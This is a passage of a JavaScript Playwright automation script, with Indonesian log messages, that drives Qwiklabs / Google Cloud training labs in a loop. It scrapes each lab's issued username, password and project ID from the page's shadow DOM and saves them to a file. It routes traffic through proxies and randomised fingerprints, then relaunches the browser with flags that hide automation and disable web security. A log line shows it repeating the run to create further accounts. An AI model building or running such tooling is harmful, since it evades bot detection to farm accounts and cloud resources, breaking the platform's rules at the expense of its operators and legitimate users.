                        console.log(`  ~ Skrip akan beristirahat (tidur) selama ${(waitMs / 1000).toFixed(0)} detik...`);
                        
                        await randomDelay(waitMs, waitMs + 1000);
                        timeWaited += waitMs;
                        maxWait += waitMs;
                        
                        console.log('  ~ Bangun dari tidur, memastikan kredensial muncul...');
                        continue; 
                    }

                } catch (err) {}

                await randomDelay(2000, 2000);
                timeWaited += 2000;
                
                if (!smartWaitTriggered && timeWaited % 10000 === 0) {
                    process.stdout.write(`\r  ~ Menunggu provisioning... (${timeWaited / 1000}s / ${maxWait / 1000}s)`);
                }
            }

            if (!labStarted) {
                console.log("\n");
                throw new Error("Gagal memuat Lab setelah batas maksimal atau lab terkena limit (Quota).");
            }

            let consoleLink = null, username = null, labPassword = null, projectId = null;

            if (labStarted) {
                console.log('  → Mengekstrak info lab...');
                const extractAll = await page.evaluate(() => {
                    function collectFromShadow(root, depth = 0) {
                        const data = { texts: [], links: [], inputs: [] };
                        if (!root || depth > 10) return data;
                        
                        const anchors = root.querySelectorAll('a');
                        for (const a of anchors) if (a.href) data.links.push({ href: a.href, text: (a.textContent || '').trim() });

                        const inputs = root.querySelectorAll('input, [contenteditable]');
                        for (const inp of inputs) {
                            const v = inp.value || inp.textContent || '';
                            if (v.trim()) data.inputs.push(v.trim());
                        }

                        const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
                        let node;
                        while (node = walker.nextNode()) {
                            const t = node.textContent.trim();
                            if (t.length > 0) data.texts.push(t);
                        }

                        const allEls = root.querySelectorAll('*');
                        for (const el of allEls) {
                            if (el.shadowRoot) {
                                const sub = collectFromShadow(el.shadowRoot, depth + 1);
                                data.texts.push(...sub.texts);
                                data.links.push(...sub.links);
                                data.inputs.push(...sub.inputs);
                            }
                        }
                        return data;
                    }

                    const panel = document.querySelector('ql-lab-control-panel');
                    if (!panel) return { texts: [], links: [], inputs: [], attrs: {} };

                    const shadowData = panel.shadowRoot ? collectFromShadow(panel.shadowRoot) : { texts: [], links: [], inputs: [] };
                    const attrs = {};
                    for (const attrName of panel.getAttributeNames()) {
                        const val = panel.getAttribute(attrName);
                        if (val && val.length < 5000) attrs[attrName] = val;
                    }
                    shadowData.attrs = attrs;
                    return shadowData;
                });

                for (const link of extractAll.links) {
                    if (link.href.includes('console.cloud.google') || link.href.includes('google_sso') || link.text.includes('Open Google Cloud')) {
                        consoleLink = link.href; break;
                    }
                }

                if (extractAll.attrs) {
                    for (const [key, val] of Object.entries(extractAll.attrs)) {
                        try {
                            const parsed = JSON.parse(val);
                            if (typeof parsed === 'object' && parsed !== null) {
                                if (parsed.username && !username) username = parsed.username;
                                if (parsed.password && !labPassword) labPassword = parsed.password;
                                if (parsed.projectId && !projectId) projectId = parsed.projectId;
                                if (parsed.project_id && !projectId) projectId = parsed.project_id;
                                if (parsed.student_email && !username) username = parsed.student_email;
                            }
                        } catch {}
                    }
                }

                const allTexts = [...extractAll.texts, ...extractAll.inputs];
                for (const t of allTexts) {
                    const trimmed = t.trim();
                    if (!username && /^student-[a-z0-9]+@/i.test(trimmed)) username = trimmed;
                    if (!projectId && /^qwiklabs-gcp-/i.test(trimmed)) projectId = trimmed;
                }

                if (!labPassword) {
                    for (const t of allTexts) {
                        const trimmed = t.trim();
                        if (trimmed.length >= 8 && trimmed.length <= 16 && /[A-Za-z]/.test(trimmed) && /\d/.test(trimmed) && !/\s/.test(trimmed)) {
                            labPassword = trimmed; break;
                        }
                    }
                }

                console.log(`\n  ┌─ Hasil Ekstraksi ──────────────────────`);
                console.log(`  │  Console Link : ${consoleLink ? 'OK' : 'FAIL'}`);
                console.log(`  │  Username     : ${username || 'FAIL'}`);
                console.log(`  │  Password     : ${labPassword || 'FAIL'}`);
                console.log(`  │  Project ID   : ${projectId || 'FAIL'}`);
                console.log(`  └────────────────────────────────────────`);

                const resultLines = [
                    `=== Lab Results === ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })} ===`,
                    `Console Link: ${consoleLink || 'not found'}`, 
                    `Username: ${username || 'not found'}`, 
                    `Password: ${labPassword || 'not found'}`, 
                    `Project ID: ${projectId || 'not found'}`, 
                    `Lab URL: ${page.url()}\n`,
                ];
                fs.appendFileSync(path.resolve(__dirname, 'result.txt'), resultLines.join('\n'), 'utf-8');
                if (consoleLink) fs.writeFileSync(path.resolve(__dirname, 'link.txt'), consoleLink + '\n', 'utf-8');
            }

            // ==========================================
            // TAHAP 4: RE-LAUNCH TANPA PROXY & EKSEKUSI
            // ==========================================
            if (consoleLink) {
                console.log('\n  → [Sistem] Menghentikan browser ber-proxy...');
                await context.close();
                await randomDelay(2000, 3000);

                console.log('  → [Sistem] Merestart browser TANPA PROXY untuk Cloud Shell...');
                context = await chromium.launchPersistentContext(profileDir, {
                    userAgent: freshUserAgent,
                    headless: useHeadless,
                    viewport: fp.viewport,
                    screen: fp.viewport,
                    args: [
                        "--start-maximized",
                        "--disable-blink-features=AutomationControlled",
                        "--no-sandbox",
                        "--disable-web-security",
                        `--disable-extensions-except=${extensionPath}`, 
                        `--load-extension=${extensionPath}`
                    ],
                    permissions: ['clipboard-read', 'clipboard-write'],
                    locale: fp.locale,
                    timezoneId: fp.timezone,
                });

                await runCloudShell(context, consoleLink, password, projectId, username, labPassword);
            }

            console.log('\n┌─────────────────────────────────────────');
            console.log(`│  Selesai! Pipeline Sukses.`);
            console.log('└─────────────────────────────────────────');
            return true;

        } catch (err) {
            console.error(`  ✘ Pipeline Error:`, err.message);
            return false;
        } finally {
            if (context) await context.close().catch(() => {});
            try {
                if (fs.existsSync(profileDir)) {
                    fs.rmSync(profileDir, { recursive: true, force: true });
                    console.log(`  🧹 Clean up: Profile dihapus.`);
                }
            } catch (cleanupErr) {}
        }
    }

    // --- LOOP EKSEKUSI UTAMA ---
    for (let i = 0; i < maxLoops; i++) {
        await processSinglePipeline(`Run ${i+1}/${maxLoops}`);
        if (i < maxLoops - 1) {
            console.log(`\n  ⏳ Jeda sejenak sebelum membuat akun berikutnya...`);
            await randomDelay(5000, 8000);
        }
    }
    
    console.log('\n  ✔ Semua operasi selesai.');
})();
